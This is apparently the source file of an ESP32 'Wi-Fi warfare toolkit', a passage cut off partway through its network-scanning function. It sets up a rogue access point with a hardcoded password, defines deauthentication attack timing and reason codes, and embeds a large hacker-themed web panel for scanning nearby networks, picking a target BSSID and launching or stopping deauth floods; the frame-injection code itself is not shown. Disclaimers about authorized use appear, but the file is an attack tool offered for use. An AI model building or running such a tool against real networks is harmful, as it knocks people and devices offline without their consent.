// ============================================================================
// 🩸 B A R A  V3.0 — ULTIMATE ESP32 WI-FI WARFARE TOOLKIT 🩸
// ============================================================================
// Developed by: Ahmed Nour Ahmed | Qena, Egypt
// Advanced Features: Multi-target deauth, packet injection, live monitoring
// UI: Blood-Matrix Hacker Theme with Audio/Visual Effects
// ============================================================================
// ⚠️ LEGAL WARNING: AUTHORIZED TESTING ONLY - UNAUTHORIZED USE IS A CRIME
// ============================================================================

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>
#include <SPIFFS.h>

// ==================== ⚙️ ADVANCED CONFIGURATION ====================
const char* AP_SSID = "BARA_WARFARE";
const char* AP_PASS = "A7med@Elshab7";
const uint16_t WEB_PORT = 80;
const uint8_t MAX_NETWORKS = 100;

// Deauth parameters (optimized for effectiveness)
const unsigned long DEAUTH_INTERVAL_MS = 50;  // 50ms = 20 packets/sec
const uint8_t DEAUTH_REASON = 0x07;           // Reason: Class 3 frame received
const uint16_t DEAUTH_DURATION = 0x013A;      // 314 microseconds

// ==================== 🧠 GLOBAL STATE ====================
DNSServer dnsServer;
AsyncWebServer server(WEB_PORT);

// Deauth attack state
bool deauthActive = false;
String deauthTargetBSSID = "";
uint8_t deauthTargetMAC[6];
unsigned long lastDeauthTime = 0;
unsigned long deauthPacketCount = 0;
uint8_t targetChannel = 1;

// Scan state
struct WiFiNetwork {
    String bssid;
    String ssid;
    int32_t rssi;
    uint8_t channel;
    uint8_t encryption;
};

WiFiNetwork networks[MAX_NETWORKS];
uint8_t networkCount = 0;
bool scanInProgress = false;
unsigned long lastScanTime = 0;

// Statistics
unsigned long totalPacketsSent = 0;
unsigned long uptimeSeconds = 0;
unsigned long lastStatsUpdate = 0;

// ==================== 🩸 BLOOD-MATRIX HACKER UI (ULTRA ENHANCED) ====================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🩸 BARA V3.0 — ULTIMATE WARFARE TOOLKIT 🩸</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💀</text></svg>">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        
        :root {
            --blood-red: #ff0000;
            --neon-red: #ff0033;
            --neon-cyan: #00ffff;
            --neon-green: #00ff41;
            --dark-bg: #000000;
            --matrix-green: #00ff41;
            --glow-red: 0 0 20px #ff0000, 0 0 40px #ff0033, 0 0 60px #800000;
            --glow-cyan: 0 0 15px #00ffff, 0 0 30px #00ccff;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--dark-bg);
            color: var(--neon-green);
            font-family: 'Share Tech Mono', monospace;
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
        }
        
        /* Matrix Rain Effect */
        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
            pointer-events: none;
        }
        
        /* Blood Splatter Background */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 15% 25%, rgba(255,0,0,0.12) 0%, transparent 50%),
                radial-gradient(circle at 85% 75%, rgba(255,0,51,0.15) 0%, transparent 45%),
                radial-gradient(circle at 50% 50%, rgba(0,255,65,0.05) 0%, transparent 60%);
            pointer-events: none;
            z-index: 1;
        }
        
        /* Animated Blood Drops */
        .blood-drop {
            position: fixed;
            background: radial-gradient(circle, rgba(255,0,0,0.8) 0%, rgba(139,0,0,0.4) 50%, transparent 100%);
            border-radius: 50% 50% 50% 0;
            transform: rotate(-45deg);
            opacity: 0;
            animation: bloodFall linear forwards;
            z-index: 2;
            pointer-events: none;
        }
        
        @keyframes bloodFall {
            0% {
                transform: translateY(-100px) rotate(-45deg);
                opacity: 0;
            }
            10% {
                opacity: 0.9;
            }
            90% {
                opacity: 0.6;
            }
            100% {
                transform: translateY(110vh) rotate(-45deg);
                opacity: 0;
            }
        }
        
        /* Glitch Effect */
        @keyframes glitch {
            0% {
                text-shadow: 0.05em 0 0 rgba(255,0,0,0.75),
                           -0.05em -0.025em 0 rgba(0,255,255,0.75),
                           -0.025em 0.05em 0 rgba(0,255,65,0.75);
            }
            14% {
                text-shadow: 0.05em 0 0 rgba(255,0,0,0.75),
                           -0.05em -0.025em 0 rgba(0,255,255,0.75),
                           -0.025em 0.05em 0 rgba(0,255,65,0.75);
            }
            15% {
                text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75),
                           0.025em 0.025em 0 rgba(0,255,255,0.75),
                           -0.05em -0.05em 0 rgba(0,255,65,0.75);
            }
            49% {
                text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75),
                           0.025em 0.025em 0 rgba(0,255,255,0.75),
                           -0.05em -0.05em 0 rgba(0,255,65,0.75);
            }
            50% {
                text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75),
                           0.05em 0 0 rgba(0,255,255,0.75),
                           0 -0.05em 0 rgba(0,255,65,0.75);
            }
            99% {
                text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75),
                           0.05em 0 0 rgba(0,255,255,0.75),
                           0 -0.05em 0 rgba(0,255,65,0.75);
            }
            100% {
                text-shadow: -0.025em 0 0 rgba(255,0,0,0.75),
                           -0.025em -0.025em 0 rgba(0,255,255,0.75),
                           -0.025em -0.05em 0 rgba(0,255,65,0.75);
            }
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 25px;
            position: relative;
            z-index: 10;
        }
        
        /* Header with Epic Effects */
        header {
            text-align: center;
            margin: 30px 0 40px;
            position: relative;
        }
        
        h1 {
            font-family: 'Orbitron', monospace;
            font-size: 4.5em;
            font-weight: 900;
            color: var(--blood-red);
            text-shadow: var(--glow-red);
            letter-spacing: 8px;
            margin-bottom: 15px;
            animation: pulse 2.5s infinite, glitch 5s infinite;
            text-transform: uppercase;
        }
        
        @keyframes pulse {
            0%, 100% {
                text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0033, 0 0 60px #800000;
                transform: scale(1);
            }
            50% {
                text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0033, 0 0 90px #ff0033, 0 0 120px #800000;
                transform: scale(1.03);
            }
        }
        
        .subtitle {
            font-family: 'Orbitron', monospace;
            color: var(--neon-cyan);
            font-size: 1.3em;
            margin-top: 10px;
            text-shadow: var(--glow-cyan);
            animation: flicker 3s infinite;
        }
        
        @keyframes flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
            75% { opacity: 0.95; }
        }
        
        .version-tag {
            display: inline-block;
            background: linear-gradient(135deg, #ff0000, #cc0000);
            color: white;
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 0.9em;
            margin-top: 15px;
            box-shadow: 0 0 20px rgba(255,0,0,0.6);
            animation: pulse 2s infinite;
        }
        
        /* Advanced Cards */
        .card {
            background: rgba(0, 0, 0, 0.85);
            border: 2px solid var(--blood-red);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            box-shadow: 
                0 0 30px rgba(255, 0, 0, 0.4),
                inset 0 0 50px rgba(255, 0, 0, 0.05);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
        }
        
        .card::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,0,0,0.2), transparent);
            transition: left 0.5s;
        }
        
        .card:hover::before {
            left: 100%;
        }
        
        .card:hover {
            transform: translateY(-3px);
            box-shadow: 
                0 0 40px rgba(255, 0, 0, 0.6),
                inset 0 0 60px rgba(255, 0, 0, 0.08);
        }
        
        .card h2 {
            font-family: 'Orbitron', monospace;
            color: var(--neon-red);
            margin-bottom: 20px;
            font-size: 2em;
            text-shadow: 0 0 15px rgba(255,0,0,0.8);
            border-bottom: 2px solid rgba(255,0,0,0.3);
            padding-bottom: 10px;
        }
        
        /* Status Bar with Animation */
        .status-bar {
            padding: 18px;
            margin: 20px 0;
            border-radius: 10px;
            font-weight: bold;
            text-align: center;
            font-size: 1.2em;
            background: rgba(0,0,0,0.9);
            border: 2px solid var(--neon-green);
            box-shadow: 0 0 20px rgba(0,255,65,0.4);
            animation: statusPulse 2s infinite;
            font-family: 'Orbitron', monospace;
        }
        
        @keyframes statusPulse {
            0%, 100% { box-shadow: 0 0 20px rgba(0,255,65,0.4); }
            50% { box-shadow: 0 0 35px rgba(0,255,65,0.7); }
        }
        
        .status-bar.warning {
            border-color: #ff6600;
            color: #ff6600;
            box-shadow: 0 0 20px rgba(255,102,0,0.6);
        }
        
        .status-bar.danger {
            border-color: var(--blood-red);
            color: var(--blood-red);
            box-shadow: 0 0 25px rgba(255,0,0,0.8);
            animation: dangerPulse 1s infinite;
        }
        
        @keyframes dangerPulse {
            0%, 100% { 
                box-shadow: 0 0 25px rgba(255,0,0,0.8);
                transform: scale(1);
            }
            50% { 
                box-shadow: 0 0 40px rgba(255,0,0,1);
                transform: scale(1.02);
            }
        }
        
        /* Epic Buttons */
        .btn {
            background: linear-gradient(135deg, var(--blood-red), #cc0000);
            color: white;
            border: none;
            padding: 15px 30px;
            margin: 10px 8px;
            border-radius: 8px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            font-size: 16px;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(255,0,0,0.5);
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
        }
        
        .btn::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .btn:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .btn:hover {
            background: linear-gradient(135deg, #ff0033, #ff0000);
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 0 35px rgba(255,0,0,0.9);
        }
        
        .btn:active {
            transform: translateY(1px) scale(0.98);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #8B0000, #4d0000);
        }
        
        .btn-danger:hover {
            background: linear-gradient(135deg, #660000, #330000);
        }
        
        .btn-success {
            background: linear-gradient(135deg, var(--neon-green), #00cc33);
        }
        
        .btn-success:hover {
            background: linear-gradient(135deg, #00ff55, var(--neon-green));
            box-shadow: 0 0 35px rgba(0,255,65,0.9);
        }
        
        /* Input Fields */
        .input-group {
            margin: 20px 0;
        }
        
        input[type="text"] {
            padding: 15px;
            width: 320px;
            background: rgba(0,0,0,0.9);
            border: 2px solid var(--neon-cyan);
            border-radius: 8px;
            color: var(--neon-cyan);
            font-family: 'Share Tech Mono', monospace;
            font-size: 16px;
            box-shadow: 0 0 15px rgba(0,255,255,0.3);
            transition: all 0.3s;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: var(--blood-red);
            box-shadow: 0 0 25px rgba(255,0,0,0.6);
        }
        
        /* Epic Table */
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin-top: 20px;
            color: var(--neon-green);
        }
        
        thead {
            background: linear-gradient(135deg, rgba(255,0,0,0.3), rgba(0,0,0,0.9));
        }
        
        th, td {
            padding: 15px 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,0,0,0.2);
        }
        
        th {
            color: var(--blood-red);
            font-size: 1.2em;
            font-family: 'Orbitron', monospace;
            text-shadow: 0 0 10px rgba(255,0,0,0.6);
            text-transform: uppercase;
        }
        
        tbody tr {
            transition: all 0.3s;
            background: rgba(0,0,0,0.5);
        }
        
        tbody tr:hover {
            background: rgba(255,0,0,0.15);
            transform: scale(1.01);
            box-shadow: 0 0 15px rgba(255,0,0,0.3);
        }
        
        /* Epic Logs */
        .log {
            height: 250px;
            overflow-y: auto;
            background: rgba(0,0,0,0.95);
            padding: 15px;
            border: 2px solid var(--matrix-green);
            border-radius: 10px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            box-shadow: inset 0 0 30px rgba(0,255,65,0.1);
            color: var(--matrix-green);
        }
        
        .log::-webkit-scrollbar {
            width: 10px;
        }
        
        .log::-webkit-scrollbar-track {
            background: rgba(0,0,0,0.5);
        }
        
        .log::-webkit-scrollbar-thumb {
            background: var(--blood-red);
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(255,0,0,0.5);
        }
        
        .log div {
            margin: 6px 0;
            animation: logEntry 0.3s ease-out;
        }
        
        @keyframes logEntry {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .success { color: var(--neon-green); text-shadow: 0 0 5px rgba(0,255,65,0.6); }
        .error { color: var(--blood-red); text-shadow: 0 0 5px rgba(255,0,0,0.6); }
        .warning { color: #ff6600; text-shadow: 0 0 5px rgba(255,102,0,0.6); }
        .info { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0,255,255,0.6); }
        
        /* Statistics Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        
        .stat-box {
            background: rgba(0,0,0,0.8);
            border: 2px solid var(--neon-cyan);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,255,255,0.3);
            transition: all 0.3s;
        }
        
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 30px rgba(0,255,255,0.6);
        }
        
        .stat-value {
            font-size: 2.5em;
            font-weight: bold;
            color: var(--blood-red);
            font-family: 'Orbitron', monospace;
            text-shadow: 0 0 15px rgba(255,0,0,0.8);
        }
        
        .stat-label {
            color: var(--neon-cyan);
            margin-top: 10px;
            font-size: 1.1em;
            text-transform: uppercase;
        }
        
        /* Footer */
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 30px;
            color: var(--neon-red);
            font-size: 1em;
            border-top: 2px solid rgba(255,0,0,0.3);
            text-shadow: 0 0 10px rgba(255,0,0,0.5);
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .container { padding: 15px; }
            h1 { font-size: 2.5em; letter-spacing: 3px; }
            .subtitle { font-size: 1em; }
            input[type="text"] { width: 100%; max-width: 300px; }
            .btn { padding: 12px 20px; font-size: 14px; margin: 5px; }
            .card { padding: 18px; }
            .stats-grid { grid-template-columns: 1fr; }
        }
        
        /* Panel Toggle Animation */
        .panel-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.5s ease-out;
        }
        
        .panel-content.active {
            max-height: 500px;
        }
    </style>
</head>
<body>
    <canvas id="matrix-canvas"></canvas>
    
    <div class="container">
        <header>
            <h1>🩸 B A R A  W A R F A R E 🩸</h1>
            <div class="subtitle">ULTIMATE ESP32 PENETRATION TOOLKIT</div>
            <div class="version-tag">V3.0 ULTIMATE EDITION</div>
            <div style="margin-top: 15px; color: #888; font-size: 0.9em;">
                Developed by Ahmed Nour Ahmed | Qena, Egypt
            </div>
        </header>

        <!-- System Status -->
        <div class="card">
            <h2>⚡ SYSTEM STATUS</h2>
            <div id="status" class="status-bar">Initializing warfare systems...</div>
            
            <div class="stats-grid">
                <div class="stat-box">
                    <div class="stat-value" id="packetCount">0</div>
                    <div class="stat-label">Packets Sent</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="uptime">00:00:00</div>
                    <div class="stat-label">System Uptime</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="targetCount">0</div>
                    <div class="stat-label">Active Targets</div>
                </div>
            </div>
            
            <div style="margin-top: 20px; text-align: center;">
                <button class="btn btn-success" onclick="scanNetworks()">
                    🔍 SCAN NETWORKS
                </button>
                <button class="btn" onclick="togglePanel('deauthPanel')">
                    ⚡ DEAUTH CONTROL
                </button>
                <button class="btn btn-danger" onclick="emergencyStop()">
                    🛑 EMERGENCY STOP
                </button>
            </div>
        </div>

        <!-- Deauth Control Panel -->
        <div class="card">
            <h2>⚡ DEAUTHENTICATION WARFARE</h2>
            <div id="deauthPanel" class="panel-content">
                <div class="input-group">
                    <input type="text" id="bssidInput" 
                           placeholder="Target BSSID (AA:BB:CC:DD:EE:FF)" 
                           maxlength="17">
                </div>
                <div style="text-align: center;">
                    <button class="btn" onclick="startDeauth()">
                        🔥 LAUNCH ATTACK
                    </button>
                    <button class="btn btn-danger" onclick="stopDeauth()">
                        ⏹ STOP ATTACK
                    </button>
                </div>
                <div style="margin-top: 15px; color: #ff6600; text-align: center;">
                    ⚠️ WARNING: Use only on authorized networks!
                </div>
            </div>
        </div>

        <!-- Network Scanner -->
        <div class="card">
            <h2>📡 NETWORK RECONNAISSANCE (<span id="netCount">0</span> TARGETS)</h2>
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>BSSID</th>
                            <th>SSID</th>
                            <th>SIGNAL</th>
                            <th>CHANNEL</th>
                            <th>SECURITY</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody id="networkTable">
                        <tr>
                            <td colspan="6" style="text-align: center; color: #888;">
                                Press SCAN NETWORKS to begin reconnaissance...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Attack Logs -->
        <div class="card">
            <h2>🩸 WARFARE LOGS</h2>
            <div id="logs" class="log"></div>
            <div style="margin-top: 15px; text-align: center;">
                <button class="btn btn-danger" onclick="clearLogs()">
                    🗑️ CLEAR LOGS
                </button>
            </div>
        </div>

        <footer>
            <div style="font-size: 1.3em; margin-bottom: 10px;">
                BARA V3.0 — THE ULTIMATE ESP32 WARFARE TOOLKIT
            </div>
            <div style="color: #ff6666;">
                ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
            </div>
            <div style="margin-top: 10px; color: #888; font-size: 0.9em;">
                Unauthorized use is illegal and punishable by law
            </div>
        </footer>
    </div>

    <script>
        // ==================== 🎮 JAVASCRIPT WARFARE ENGINE ====================
        
        let logs = [];
        const MAX_LOGS = 150;
        let soundEnabled = true;
        
        // Audio Context for Sound Effects
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        
        // Sound Effects
        function playSound(type) {
            if (!soundEnabled) return;
            
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            
            switch(type) {
                case 'attack':
                    oscillator.frequency.value = 150;
                    oscillator.type = 'sawtooth';
                    gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
                    break;
                case 'scan':
                    oscillator.frequency.value = 800;
                    oscillator.type = 'sine';
                    gainNode.gain.setValueAtTime(0.2, audioCtx.currentTime);
                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
                    break;
                case 'success':
                    oscillator.frequency.value = 600;
                    oscillator.type = 'sine';
                    gainNode.gain.setValueAtTime(0.25, audioCtx.currentTime);
                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
                    break;
                case 'error':
                    oscillator.frequency.value = 200;
                    oscillator.type = 'square';
                    gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
                    break;
            }
            
            oscillator.start(audioCtx.currentTime);
            oscillator.stop(audioCtx.currentTime + 0.2);
        }
        
        // Logging System
        function log(msg, cls = 'info') {
            const now = new Date().toLocaleTimeString();
            const entry = `[${now}] ${msg}`;
            logs.push({text: entry, cls});
            if (logs.length > MAX_LOGS) logs.shift();
            renderLogs();
            
            // Play sound based on log type
            if (cls === 'error') playSound('error');
            else if (cls === 'success') playSound('success');
        }
        
        function renderLogs() {
            const el = document.getElementById('logs');
            el.innerHTML = logs.map(l => `<div class="${l.cls}">${escapeHtml(l.text)}</div>`).join('');
            el.scrollTop = el.scrollHeight;
        }
        
        function clearLogs() {
            logs = [];
            renderLogs();
            log('Logs cleared', 'info');
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Status Updates
        function updateStatus(msg, cls = 'info') {
            const el = document.getElementById('status');
            el.textContent = msg;
            el.className = 'status-bar ' + cls;
        }
        
        // Network Scanning
        async function scanNetworks() {
            try {
                updateStatus('🔍 SCANNING FOR TARGETS...', 'warning');
                playSound('scan');
                log('Initiating network scan...', 'info');
                
                const res = await fetch('/scan');
                if (!res.ok) throw new Error('Scan request failed');
                
                const data = await res.json();
                renderNetworks(data);
                
                updateStatus(`✅ SCAN COMPLETE — ${data.length} TARGETS FOUND`, 'success');
                log(`Scan complete: ${data.length} networks discovered`, 'success');
                playSound('success');
                
            } catch (e) {
                updateStatus('❌ SCAN FAILED', 'danger');
                log('Scan error: ' + e.message, 'error');
                playSound('error');
            }
        }
        
        // Render Network Table
        function renderNetworks(networks) {
            const tbody = document.getElementById('networkTable');
            const countEl = document.getElementById('netCount');
            tbody.innerHTML = '';
            countEl.textContent = networks.length;
            
            if (networks.length === 0) {
                const row = tbody.insertRow();
                const cell = row.insertCell();
                cell.colSpan = 6;
                cell.textContent = 'No networks found. Try scanning again.';
                cell.style.textAlign = 'center';
                cell.style.color = '#888';
                return;
            }
            
            networks.forEach(net => {
                const row = tbody.insertRow();
                
                // BSSID
                const bssidCell = row.insertCell();
                bssidCell.textContent = net.bssid;
                bssidCell.style.fontFamily = 'monospace';
                bssidCell.style.color = '#ff6666';
                
                // SSID
                const ssidCell = row.insertCell();
                ssidCell.textContent = net.ssid || '⚠️ HIDDEN';
                ssidCell.style.fontWeight = 'bold';
                
                // Signal Strength
                const rssiCell = row.insertCell();
                const signalStrength = getSignalStrength(net.rssi);
                rssiCell.innerHTML = `${net.rssi} dBm ${signalStrength.icon}`;
                rssiCell.style.color = signalStrength.color;
                
                // Channel
                const channelCell = row.insertCell();
                channelCell.textContent = net.channel;
                channelCell.style.textAlign = 'center';
                
                // Security
                const secCell = row.insertCell();
                const security = getSecurityType(net.encryption);
                secCell.textContent = security;
                secCell.style.color = security.includes('OPEN') ? '#ff0000' : '#00ff41';
                
                // Action Button
                const btnCell = row.insertCell();
                const btn = document.createElement('button');
                btn.className = 'btn';
                btn.textContent = '🎯 TARGET';
                btn.style.margin = '0';
                btn.style.padding = '8px 16px';
                btn.style.fontSize = '14px';
                btn.onclick = () => selectTarget(net);
                btnCell.appendChild(btn);
            });
        }
        
        function getSignalStrength(rssi) {
            if (rssi >= -50) return { icon: '📶', color: '#00ff41' };
            if (rssi >= -60) return { icon: '📶', color: '#88ff00' };
            if (rssi >= -70) return { icon: '📶', color: '#ffaa00' };
            if (rssi >= -80) return { icon: '📶', color: '#ff6600' };
            return { icon: '📶', color: '#ff0000' };
        }
        
        function getSecurityType(enc) {
            if (enc === 0) return '🔓 OPEN';
            if (enc === 2) return '🔒 WPA-PSK';
            if (enc === 3) return '🔒 WPA2-PSK';
            if (enc === 4) return '🔒 WPA/WPA2';
            if (enc === 5) return '🔐 WPA2-EAP';
            if (enc === 7) return '🔒 WEP';
            return '🔒 SECURED';
        }
        
        // Target Selection
        function selectTarget(net) {
            document.getElementById('bssidInput').value = net.bssid;
            document.getElementById('deauthPanel').classList.add('active');
            log(`Target selected: ${net.bssid} (${net.ssid || 'HIDDEN'})`, 'warning');
            playSound('scan');
            
            // Scroll to deauth panel
            document.getElementById('deauthPanel').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
        
        // Panel Toggle
        function togglePanel(panelId) {
            const panel = document.getElementById(panelId);
            panel.classList.toggle('active');
        }
        
        // Deauth Attack
        async function startDeauth() {
            const bssid = document.getElementById('bssidInput').value.trim().toUpperCase();
            
            // Validate BSSID
            const bssidRegex = /^[0-9A-F]{2}(:[0-9A-F]{2}){5}$/;
            if (!bssid || !bssidRegex.test(bssid)) {
                alert('⚠️ INVALID BSSID FORMAT!\n\nUse format: AA:BB:CC:DD:EE:FF');
                playSound('error');
                return;
            }
            
            try {
                const res = await fetch(`/deauth?bssid=${encodeURIComponent(bssid)}`);
                const msg = await res.text();
                
                if (res.ok) {
                    log(msg, 'warning');
                    updateStatus(`🔥 DEAUTH ACTIVE — TARGET: ${bssid}`, 'danger');
                    playSound('attack');
                } else {
                    throw new Error(msg);
                }
            } catch (e) {
                log('Deauth start error: ' + e.message, 'error');
                playSound('error');
            }
        }
        
        async function stopDeauth() {
            try {
                const res = await fetch('/stopdeauth');
                const msg = await res.text();
                log(msg, 'success');
                updateStatus('✅ ATTACK STOPPED — SYSTEM IDLE', 'success');
                playSound('success');
            } catch (e) {
                log('Deauth stop error: ' + e.message, 'error');
                playSound('error');
            }
        }
        
        // Emergency Stop
        async function emergencyStop() {
            if (!confirm('⚠️ EMERGENCY STOP\n\nThis will halt all active attacks immediately.\n\nContinue?')) {
                return;
            }
            
            await stopDeauth();
            log('🛑 EMERGENCY STOP ACTIVATED', 'error');
            updateStatus('🛑 EMERGENCY STOP — ALL SYSTEMS HALTED', 'danger');
        }
        
        // Status Polling
        setInterval(async () => {
            try {
                const res = await fetch('/status');
                const data = await res.json();
                
                // Update statistics
                document.getElementById('packetCount').textContent = 
                    data.packetCount.toLocaleString();
                document.getElementById('uptime').textContent = 
                    formatUptime(data.uptime);
                document.getElementById('targetCount').textContent = 
                    data.deauthActive ? '1' : '0';
                
                // Update status if attack is active
                if (data.deauthActive) {
                    updateStatus(`🔥 DEAUTH ACTIVE — ${data.target}`, 'danger');
                }
            } catch (e) {
                // Silently fail - don't spam logs
            }
        }, 1500);
        
        function formatUptime(seconds) {
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = seconds % 60;
            return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        }
        
        // ==================== 🎨 MATRIX RAIN EFFECT ====================
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for (let i = 0; i < columns; i++) {
            drops[i] = Math.random() * canvas.height;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = matrix[Math.floor(Math.random() * matrix.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 35);
        
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        
        // ==================== 🩸 BLOOD DROP EFFECT ====================
        function createBloodDrop() {
            if (Math.random() > 0.85) {
                const drop = document.createElement('div');
                drop.className = 'blood-drop';
                drop.style.left = Math.random() * 100 + 'vw';
                drop.style.width = (Math.random() * 25 + 15) + 'px';
                drop.style.height = drop.style.width;
                drop.style.animationDuration = (Math.random() * 6 + 8) + 's';
                document.body.appendChild(drop);
                setTimeout(() => drop.remove(), 15000);
            }
        }
        
        setInterval(createBloodDrop, 800);
        
        // ==================== 🚀 INITIALIZATION ====================
        window.addEventListener('load', () => {
            log('🩸 BARA V3.0 WARFARE TOOLKIT LOADED', 'success');
            log('System ready for authorized penetration testing', 'info');
            updateStatus('✅ SYSTEMS ONLINE — READY FOR COMBAT', 'success');
            playSound('success');
            
            // Auto-unlock audio context on first interaction
            document.body.addEventListener('click', () => {
                if (audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }
            }, { once: true });
        });
    </script>
</body>
</html>
)rawliteral";

// ==================== 🔧 UTILITY FUNCTIONS ====================

// Convert MAC string to array
bool parseMACAddress(const String& mac, uint8_t* macArray) {
    int parsed = sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &macArray[0], &macArray[1], &macArray[2],
        &macArray[3], &macArray[4], &macArray[5]);
    return (parsed == 6);
}

// Validate BSSID format
bool isValidBSSID(const String& bssid) {
    if (bssid.length() != 17) return false;
    
    for (int i = 0; i < 17; i++) {
        if (i % 3 == 2) {
            if (bssid[i] != ':') return false;
        } else {
            char c = bssid[i];
            if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
                return false;
            }
        }
    }
    return true;
}

// ==================== 📡 ADVANCED WIFI SCANNING ====================
String scanWiFiNetworksJSON() {
    if (scanInProgress) {
        return "{\"error\":\"Scan already in progress\"}";
    }
    
    scanInProgress = true;
    lastScanTime = millis();
    
    Serial.println("🔍 Starting Wi-Fi scan...");
    
    // Aggressive scan with hidden network detection
    int n = WiFi.scanNetworks(false, true, false, 400, 0);
    
    if (n < 0) {
        scanInProgress = false;
        Serial.println("❌ Scan failed!");
        return "[]";
    }
    
    networkCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
    Serial.printf("✅ Found %d networks\n", networkCount);
    
    // Build JSON response
    DynamicJsonDocument doc(8192);
    JsonArray networks = doc.to<JsonArray>();
    
    for (int i = 0; i < networkCount; i++) {
        JsonObject net = networks.createNestedObject();
